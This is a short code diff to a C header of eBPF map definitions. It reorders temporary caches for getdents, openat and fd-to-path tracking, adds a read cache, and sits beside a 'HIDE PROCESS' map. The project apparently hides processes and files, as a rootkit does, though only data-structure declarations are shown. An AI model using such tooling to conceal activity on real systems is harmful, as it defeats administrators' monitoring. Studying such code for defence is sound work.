@@ -40,32 +40,6 @@ struct {
 
 //----------------------------------------------------
 // ┌────────────────────────────────────┐
-//  TMP CACHES
-// └────────────────────────────────────┘
-//----------------------------------------------------
-struct {
-    __uint(type, BPF_MAP_TYPE_LRU_HASH);
-    __uint(max_entries, 1028);
-    __type(key, __u64); //pid_tgid as key.
-    __type(value, __u64);
-} getdents_cache SEC(".maps");
-
-struct {
-    __uint(type, BPF_MAP_TYPE_LRU_HASH);
-    __uint(max_entries, 4096);
-    __type(key, __u64); // pid_tgid complet (unique par thread en vol)
-    __type(value, char[MAX_PATH]);
-} openat_cache SEC(".maps");
-
-struct {
-    __uint(type, BPF_MAP_TYPE_LRU_HASH);
-    __uint(max_entries, 1028);
-    __type(key, struct fd_key);
-    __type(value, char[MAX_PATH]);
-} fd_to_path_cache SEC(".maps");
-
-//----------------------------------------------------
-// ┌────────────────────────────────────┐
 //  HIDE PROCESS
 // └────────────────────────────────────┘
 //----------------------------------------------------
@@ -83,5 +57,41 @@ struct {
 } hide_pid_cache SEC(".maps");
 
 //---------------------------------------------------------------
+
+//----------------------------------------------------
+// ┌────────────────────────────────────┐
+//  TMP CACHES
+// └────────────────────────────────────┘
+//----------------------------------------------------
+
+//getdents handling.
+struct {
+    __uint(type, BPF_MAP_TYPE_LRU_HASH);
+    __uint(max_entries, 1028);
+    __type(key, __u64);  //pid_tgid as key.
+    __type(value, __u64);
+} getdents_cache SEC(".maps");
+
+//openat & read handling.
+struct {
+    __uint(type, BPF_MAP_TYPE_LRU_HASH);
+    __uint(max_entries, 4096);
+    __type(key, __u64);  // pid_tgid complet (unique par thread en vol)
+    __type(value, char[MAX_PATH]);
+} openat_cache SEC(".maps");
+
+struct {
+    __uint(type, BPF_MAP_TYPE_LRU_HASH);
+    __uint(max_entries, 4096);
+    __type(key, __u64);   // pid_tgid complet (unique par thread en vol)
+    __type(value, struct sys_enter_cached_val);
+} read_cache SEC(".maps");
+
+struct {
+    __uint(type, BPF_MAP_TYPE_LRU_HASH);
+    __uint(max_entries, 1028);
+    __type(key, struct fd_key);
+    __type(value, char[MAX_PATH]);
+} fd_to_path_cache SEC(".maps");
 
 #endif
